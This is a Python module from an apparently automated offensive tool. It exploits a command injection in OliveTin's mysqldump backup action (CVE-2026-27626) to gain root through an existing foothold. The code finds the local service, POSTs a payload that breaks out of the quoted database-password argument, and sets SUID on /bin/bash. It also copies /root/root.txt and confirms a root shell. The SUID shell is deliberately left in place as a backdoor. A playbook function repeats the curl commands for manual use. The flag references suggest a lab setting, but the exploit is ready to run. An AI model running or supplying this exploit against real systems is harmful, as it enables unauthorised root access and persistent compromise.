"""OliveTin root privesc via the mysqldump command injection (CVE-2026-27626).

OliveTin is a small web UI that runs pre-defined shell actions. When it runs as
root (common) with `authRequireGuestsToLogin: false`, and one of its actions
builds a `mysqldump` command by splicing an API-controlled value into a shell
string, the single-quoted database-password argument can be broken out of to run
arbitrary commands AS ROOT:

    db_pass = x' ; <your command> ; #

The service is almost always bound to 127.0.0.1:1337, so it isn't reachable from
the attacker box — you reach it *through a foothold*. This module takes a
command-execution channel scryer already has on the target (e.g. sqlmap
--os-cmd from the OpenSTAManager SQLi, or an agent-held shell) and, over that
channel, curls the OliveTin API to install a SUID /bin/bash and read root.txt.

`escalate(host, run_cmd)` — run_cmd(cmd)->str runs one shell command on the
target and returns its stdout. Everything here is a root-*access* action (a
SUID shell + reading a flag); nothing destructive is issued.
"""

from __future__ import annotations

import re
from typing import Callable, List, Optional

from ...core import utils
from ...core.report import HostReport, Finding

_PORTS = (1337, 1338, 8000)
_MARKER = "OSCRYER_ROOT"


def escalate(host: HostReport, run_cmd: Callable[[str], str],
             base_port: int = 0) -> bool:
    """Drive the OliveTin injection over an on-box command channel. Returns True
    if a root flag or a confirmed root primitive is obtained."""
    port = _discover(run_cmd, base_port)
    if not port:
        utils.log("dim", "no local OliveTin service found via the foothold "
                         "(looked on 127.0.0.1:1337) — skipping OliveTin privesc",
                  indent=1)
        return False
    utils.log("hot", f"OliveTin reachable on 127.0.0.1:{port} via the foothold — "
                     "attempting CVE-2026-27626 (mysqldump injection) to root",
              indent=1)

    action = _find_backup_action(run_cmd, port)
    # Inject: break out of the single-quoted db_pass, make /bin/bash SUID, and
    # (as a second payload) copy root's flag somewhere world-readable + tagged.
    inject = (f"x' ; chmod u+s /bin/bash ; "
              f"cp /root/root.txt /tmp/.{_MARKER} 2>/dev/null ; "
              f"chmod 644 /tmp/.{_MARKER} 2>/dev/null ; #")
    _fire(run_cmd, port, action, inject)

    # 1) read the flag we staged; 2) confirm the SUID root shell independently.
    flag = run_cmd(f"cat /tmp/.{_MARKER} 2>/dev/null").strip()
    rooted = run_cmd("ls -la /bin/bash; /bin/bash -p -c 'id' 2>/dev/null").strip()
    got = _report(host, port, flag, rooted)
    # tidy the staged copy (leave /bin/bash SUID as the operator's root primitive)
    run_cmd(f"rm -f /tmp/.{_MARKER} 2>/dev/null")
    return got


# --------------------------------------------------------------------------
def _discover(run_cmd: Callable[[str], str], base_port: int) -> Optional[int]:
    ports: List[int] = ([base_port] if base_port else []) + list(_PORTS)
    listening = run_cmd("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
    for p in ports:
        if f":{p}" in (listening or "") or f".{p} " in (listening or ""):
            return p
    # fall back to probing the API directly even if ss is unavailable
    for p in ports:
        out = run_cmd(f"curl -s -m 4 http://127.0.0.1:{p}/api/GetDashboardComponents "
                      f"http://127.0.0.1:{p}/webui/ 2>/dev/null")
        if out and re.search(r"(?i)olivetin|actionButtons|GetDashboard", out):
            return p
    return None


def _find_backup_action(run_cmd: Callable[[str], str], port: int) -> str:
    """Best-effort discovery of the mysqldump/backup action's id or title; the
    API accepts the action title, so default to the known 'Backup Database'."""
    out = run_cmd(f"curl -s -m 5 http://127.0.0.1:{port}/api/GetDashboardComponents "
                  "2>/dev/null")
    m = re.search(r'"(?:actionId|id|title)"\s*:\s*"([^"]*[Bb]ackup[^"]*)"', out or "")
    if m:
        return m.group(1)
    for kw in ("backup", "mysqldump", "dump"):
        m = re.search(rf'"([^"]*{kw}[^"]*)"', out or "", re.I)
        if m:
            return m.group(1)
    return "Backup Database"


def _fire(run_cmd: Callable[[str], str], port: int, action: str,
          inject: str) -> None:
    """POST to the OliveTin StartActionAndWait API with the injected argument.
    Try the arg name the box uses (db_pass) plus common alternates, and both
    the wait and fire-and-forget endpoints."""
    import json
    import shlex
    base = f"http://127.0.0.1:{port}"
    for argname in ("db_pass", "password", "db_password", "pass"):
        body = json.dumps({"actionId": action, "arguments": {argname: inject}})
        for ep in ("/api/StartActionAndWait", "/api/StartAction"):
            run_cmd(f"curl -s -m 8 -X POST {base}{ep} "
                    "-H 'Content-Type: application/json' "
                    f"-d {shlex.quote(body)} 2>/dev/null")


def _report(host: HostReport, port: int, flag: str, rooted: str) -> bool:
    got = False
    from ...data import knowledge
    for tok in knowledge.find_flags(flag or "", allow_hex=True):
        got = True
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c("║ ROOT FLAG (OliveTin CVE-2026-27626)", utils.C.GREEN,
                             utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
        host.add(Finding(title="ROOT FLAG via OliveTin CVE-2026-27626", detail=tok,
                         severity="critical", category="flag", port=port,
                         service="olivetin", evidence=tok))
    suid = "rws" in (rooted or "") or "uid=0(root)" in (rooted or "")
    if suid:
        utils.log("hot", "root primitive confirmed: SUID /bin/bash "
                         "(run `/bin/bash -p` for a root shell)", indent=1)
        host.add(Finding(
            title="Root via OliveTin mysqldump injection (CVE-2026-27626)",
            detail="OliveTin ran as root and its Backup Database action spliced an "
                   "API-controlled db_pass into a shell string; broke out of the "
                   "single quotes to set SUID on /bin/bash. Run `/bin/bash -p` for "
                   "a root shell, then `cat /root/root.txt`.",
            severity="critical", category="vuln", port=port, service="olivetin",
            evidence=(rooted or "")[:200]))
    elif not got:
        utils.log("warn", "OliveTin injection fired but neither the flag nor a "
                          "SUID shell confirmed — the action name/arg may differ; "
                          "check the API (GetDashboardComponents) manually", indent=1)
    return got or suid


def playbook_finding(host: HostReport, port: int = 1337) -> None:
    """Emit the manual OliveTin root path as a finding (used when scryer has a
    foothold but no clean programmatic exec channel to drive it itself)."""
    host.add(Finding(
        title="Privesc: OliveTin mysqldump injection (CVE-2026-27626)",
        detail=(
            f"If a root-owned OliveTin is bound to 127.0.0.1:{port} "
            "(authRequireGuestsToLogin:false) with a 'Backup Database' action that "
            "runs mysqldump, break out of the single-quoted db_pass to run commands "
            "as root. From the foothold shell:\n"
            f"  curl -s http://127.0.0.1:{port}/api/GetDashboardComponents   # find the action\n"
            f"  curl -s -X POST http://127.0.0.1:{port}/api/StartActionAndWait \\\n"
            "    -H 'Content-Type: application/json' \\\n"
            "    -d '{\"actionId\":\"Backup Database\",\"arguments\":"
            "{\"db_pass\":\"x'\"'\"' ; chmod u+s /bin/bash ; #\"}}'\n"
            "  /bin/bash -p -c 'cat /root/root.txt'"),
        severity="high", category="vuln", port=port, service="olivetin",
        confidence="potential", evidence="OliveTin CVE-2026-27626"))
